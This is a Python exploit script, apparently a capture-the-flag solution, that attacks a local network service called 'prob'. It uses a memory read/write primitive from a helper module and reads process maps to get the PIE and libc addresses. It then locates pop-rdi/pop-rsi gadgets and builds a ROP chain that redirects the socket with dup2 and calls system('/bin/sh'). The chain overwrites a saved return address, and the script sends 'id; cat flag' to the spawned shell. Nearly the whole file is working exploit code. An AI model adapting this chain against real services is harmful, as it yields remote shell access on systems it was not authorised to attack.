#!/usr/bin/env python3
import importlib.util, subprocess, time, re, struct, socket, os
spec=importlib.util.spec_from_file_location('e','/mnt/data/notebook2/exploit_test2.py'); e=importlib.util.module_from_spec(spec); spec.loader.exec_module(e)

def p64(x): return struct.pack('<Q',x)
def find_gadget(lib, pat):
    data=open(lib,'rb').read()
    eh=struct.unpack_from('<16sHHIQQQIHHHHHH',data,0)
    phoff,phentsize,phnum=eh[5],eh[9],eh[10]
    ranges=[]
    for i in range(phnum):
        p_type,p_flags,p_offset,p_vaddr,p_paddr,p_filesz,p_memsz,p_align=struct.unpack_from('<IIQQQQQQ',data,phoff+i*phentsize)
        if p_type==1 and p_flags&1:
            ranges.append((p_offset,p_offset+p_filesz,p_vaddr-p_offset))
    idx=0
    while True:
        idx=data.find(pat,idx)
        if idx<0: raise Exception('gadget not found')
        for a,b,d in ranges:
            if a<=idx<b: return idx+d
        idx+=1

def nm_sym(lib,name):
    out=subprocess.check_output(['nm','-D',lib],text=True,errors='ignore')
    m=re.search(r'^([0-9a-fA-F]+)\s+\w\s+'+re.escape(name)+r'(?:@@|@)',out,re.M)
    if not m: raise Exception('sym '+name)
    return int(m.group(1),16)

def recv_some(s, t=1):
    s.settimeout(t)
    out=b''
    try:
        while True:
            b=s.recv(4096)
            if not b: break
            out+=b
            if len(b)<4096: break
    except Exception: pass
    return out

port=5005
p=subprocess.Popen(['/mnt/data/notebook2/public/prob',str(port)],cwd='/mnt/data/notebook2/public',stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
time.sleep(.1)
try:
    A,B,T,read,write,head=e.build_primitive(port=port)
    maps=open(f'/proc/{p.pid}/maps').read()
    pie=int([l.split('-')[0] for l in maps.splitlines() if '/prob' in l and 'r-xp' in l][0],16)
    libc_line=[l for l in maps.splitlines() if 'libc.so.6' in l and 'r--p 00000000' in l][0]
    libc_base=int(libc_line.split('-')[0],16)
    libc_path=libc_line.split()[-1]
    print('[+] pie',hex(pie),'libc',hex(libc_base),libc_path)
    conns=pie+0x4060
    blob=read(conns,24*3)
    bfd=struct.unpack('<i',blob[24:28])[0]
    bthr=e.u64(blob[24+8:24+16])
    print('[+] B fd',bfd,'pthread',hex(bthr))
    target_ret=pie+0x182f
    start=(bthr-0x20000)&~0xf
    data=read(start,0x20000)
    saved=None
    for off in range(0,len(data)-8,8):
        if e.u64(data[off:off+8])==target_ret:
            saved=start+off; break
    print('[+] saved RIP',hex(saved),'target val',hex(target_ret))
    pop_rdi=libc_base+find_gadget(libc_path,b'\x5f\xc3')
    pop_rsi=libc_base+find_gadget(libc_path,b'\x5e\xc3')
    ret=libc_base+find_gadget(libc_path,b'\xc3')
    dup2=libc_base+nm_sym(libc_path,'dup2')
    system=libc_base+nm_sym(libc_path,'system')
    binsh=libc_base+open(libc_path,'rb').read().find(b'/bin/sh\x00')
    print('[+] gadgets',hex(pop_rdi),hex(pop_rsi),hex(ret),'dup2',hex(dup2),'system',hex(system),'binsh',hex(binsh))
    chain=p64(ret)
    for fdto in [0,1,2]:
        chain += p64(pop_rdi)+p64(bfd)+p64(pop_rsi)+p64(fdto)+p64(dup2)
    chain += p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
    # forge the note to write into B's current handle_event saved return address
    A.edit(e.note_struct(b'fake',b'tok',0,len(chain),saved,head))
    B.send_evt(e.EDIT, chain)
    time.sleep(0.2)
    print('[+] poll after rop', p.poll())
    s=B.raw(); s.settimeout(2)
    s.sendall(b'echo READY; id; cat flag; exit\n')
    time.sleep(0.5)
    print('[+] poll before recv', p.poll()); print(recv_some(s,2).decode(errors='replace')); print('[+] poll after recv', p.poll())
finally:
    p.terminate();
    try: p.wait(timeout=1)
    except: p.kill()
